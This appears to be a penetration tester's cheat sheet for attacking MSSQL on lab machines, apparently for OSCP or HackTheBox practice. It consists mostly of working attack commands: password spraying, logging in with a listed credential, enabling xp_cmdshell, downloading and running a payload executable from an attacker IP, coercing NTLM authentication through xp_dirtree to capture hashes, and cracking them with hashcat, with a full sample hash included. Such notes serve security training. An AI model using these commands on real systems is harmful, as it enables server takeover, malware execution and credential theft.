Port 1433

spray:
```
nxc mssql 10.10.159.148 -u sql_svc -p Dolphin1 -x whoami
```

shell
```
mssqlclient.py -windows-auth oscp.exam/sql_svc:'Dolphin1'@10.10.159.148
```
- also try without `-windows-auth`

once connected to SQL, try enabling xp_cmdshell to run commands:
SQL> `use master`
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
SQL> `sp_configure 'show advanced options', '1'`
[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> `RECONFIGURE`
SQL> `sp_configure 'xp_cmdshell', '1'`
[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> `RECONFIGURE`
SQL> `EXEC master..xp_cmdshell 'whoami'`
nt service\mssql$sqlexpress                                                                                     
SQL > `exec xp_cmdshell "powershell -c iwr -uri http://10.10.126.147:83/payload_1234.exe -Outfile c:\windows\temp\payload_1234.exe"`
SQL> `exec xp_cmdshell "powershell -c c:\windows\temp\payload_1234.exe"`

if no xp_cmdshell permissions, try xp_dirtree & impacket smbserver:
```
smbserver.py test . -smb2support
```
SQL> `EXEC xp_dirtree '\\<kali.ip>\test', 1, 1`
- will see user hash in smbserver.py
- can also use responder
	- `sudo responder -I tun0 `
- to crack ntlmv2 hash, copy entire hash, starting with first letter and run:
	- `hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`
	- example hash to save in hashes.txt:
`DC01$::MANAGER:aaaaaaaaaaaaaaaa:a449be48471697e29e12179c8b3f4a4b:01010000000000008075a48fc5c5da011cc09eeab02291ec0000000001001000420044005600740068006b004b006c0003001000420044005600740068006b004b006c000200100063004e004200640050006700620064000400100063004e00420064005000670062006400070008008075a48fc5c5da01060004000200000008003000300000000000000000000000003000001b8f515b7210704c5914dd1d2d8ae1436fa4c997960b22794c47bffdbd369bdf0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330030000000000000000000`

SQL> `enum_db`
- will show databases
- master, tempdb, model, and msdb are all default

SQL>`xp_dirtree C:\`
- see filesystem
- if the machine also has port 80 open, check C:\inetpub\wwwroot for any files/pages not obviously accesible from website. than grab it with:
	- `wget http://manager.htb/website-backup-27-07-23-old.zip`

